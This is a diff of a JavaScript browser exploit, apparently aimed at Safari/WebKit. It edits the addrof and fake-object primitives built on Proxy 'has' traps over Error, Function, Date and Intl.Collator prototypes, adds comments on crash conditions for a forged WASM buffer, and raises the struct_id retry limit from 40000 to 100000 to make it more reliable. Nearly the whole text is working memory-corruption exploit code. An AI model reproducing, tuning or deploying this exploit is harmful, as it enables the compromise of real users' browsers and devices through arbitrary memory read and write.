@@ -108,7 +108,7 @@
     //var VM_PROT_NO_CHANGE = 8
     //var VM_PROT_COPY = 16
     let fail = function fail(x) {
-        alert('FAIL: ' + x);
+        //alert('FAIL: ' + x);
         alert1('[-] FAIL: ' + x);
         //location.reload();
         throw null;
@@ -245,7 +245,7 @@
         // altought this can be written nicer...
         function __addrof(val) {
             let s = new Error();
-            let confuse = new Array(13.37, 13.37);
+            let confuse = [13.37, 13.37];
             s[1] = 1;
             let hack = 0;
             Error.prototype.__proto__ = new Proxy(Error.prototype.__proto__, {
@@ -281,7 +281,7 @@
         //TODO: need to know what this function do
         function addrof2(val) {
             let s = new Function();
-            let confuse = new Array(13.37, 13.37);
+            let confuse = [13.37, 13.37];
             s[1] = 1;
             let hack = 0;
             Function.prototype.__proto__ = new Proxy(Function.prototype.__proto__, {
@@ -316,28 +316,33 @@
 
         function fake_obj_at_address(where, high) {
             let s = new Date();
-            let confuse = new Array(13.37, 13.37);
+            let confuse = [13.37, 13.37];
             s[1] = 1;
             let hack = 0;
 
+            //get in this function while exec victim
             Date.prototype.__proto__ = new Proxy(Date.prototype.__proto__, {
                 has: function () {
+                    //will get in with hack in 1 while 'where' near 0x4200000000000000
                     if (hack) {
                         confuse[1] = {};
                     }
+                //crash while first leave this function with first get in the web page
+                //while the fakeWasmBuffer will be finally catch
+                //and will not crash while get invalid struct_id after even 100000 times
                 }
             });
 
             function victim(oj, f64, u32, doubleArray) {
                 doubleArray[0];
-                let r = 5 in oj;
+                let r = 5 in oj;//will get in the Date.has function
                 f64[0] = f64[1] = doubleArray[1];
 
                 u32[3] = high;
                 u32[2] = where;
                 doubleArray[1] = f64[1];
                 return r;
-            };
+            }
 
             let u32 = new Uint32Array(4);
             let f64 = new Float64Array(u32.buffer);
@@ -349,7 +354,7 @@
 
         function fake_obj_at_address2(where, high) {
             let s = new Intl.Collator();
-            let confuse = new Array(13.37, 13.37);
+            let confuse = [13.37, 13.37];
             s[0] = 1;
             let hack = 0;
             Intl.Collator.prototype.__proto__ = new Proxy(Intl.Collator.prototype.__proto__, {
@@ -368,7 +373,7 @@
                 u32[2] = where;
                 doubleArray[1] = f64[1];
                 return r;
-            };
+            }
 
             let u32 = new Uint32Array(4);
             let f64 = new Float64Array(u32.buffer);
@@ -490,9 +495,18 @@
                         it will just get wrong for a few times ,
                         get not enough for a few times
                         but will finally get a correct result
+
+                        If in debug mode, say the Safari Web Inspector
+                        40000 will be not enough for neither fakeWasmBuffer
+                        bigger than 0x100000000000 nor less
+
+                        It will crash while fakeWasmBuffer near 0x100000000
+                        sometimes maxtry bigger than 80000, less than 100000
+                        sometimes less than 80000
                     */
-                    if (maxtry === 40000) {
-                        fail("wow 40000 tries on getting valid struct_id failed!!!");
+
+                    if (maxtry === 100000) {
+                        fail("wow 100000 tries on getting valid struct_id failed!!!");
                     }
                 }
                 log('\t[+] Successfully got fakeobj as WASMObject');
